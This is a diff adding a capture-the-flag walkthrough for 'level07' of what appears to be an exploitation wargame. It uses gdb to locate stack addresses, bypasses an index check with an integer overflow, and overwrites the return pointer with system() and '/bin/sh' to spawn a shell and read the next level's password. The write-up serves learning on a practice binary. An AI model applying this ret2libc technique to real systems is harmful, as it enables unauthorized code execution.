@@ -1,0 +1,30 @@
+start ssh connection with ssh -p 4242 level07@127.0.0.1 use flag from level06
+
+the programm (see source) lets us store and read numbers. it stores them in a massive but we can put any index and go outside of it
+there is a number of limitations for indexes, the only important one is that it can not be divided by 3
+we can calculate the indexes to change the return pointer to system and its argument to "bin/sh"
+
+lets set a break at the beginning of the read_number funtion
+b *0x080486dd
+x/x $ebp+0x8 - 0xffffd504
+the address of our storage inside read number function - we can count from it
+
+now we need a break at main
+b *0x08048723
+info frame to find that 0xffffd6cc is return pointer address that contains 0xf7e45513 for now
+we can calculate the index to change this!
+0xffffd6cc - 0xffffd504 = 4294956748 - 4294956292 = 456 (/4 = 114)
+unfortunately this value is protected (dividable on 3) but we can overflow the int with (4294967296 / 4 ) + 114 = 1073741938 - this one %3 = 1
+we can take addresses of system and /bin/sh from previous levels or find them again:
+info function system
+0xf7e6aed0 = 4159090384 in decimal
+
+info proc map 
+find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+0xf7f897ec = 4160264172 in decimal
+
+116 for index now - 2 pointers higher (old frame pointer is untouched inbetween)
+
+now we just store the number 4159090384 for index 1073741938 and 4160264172 for index 116 and quit
+
+go to the level08 folder and check flag in .pass!
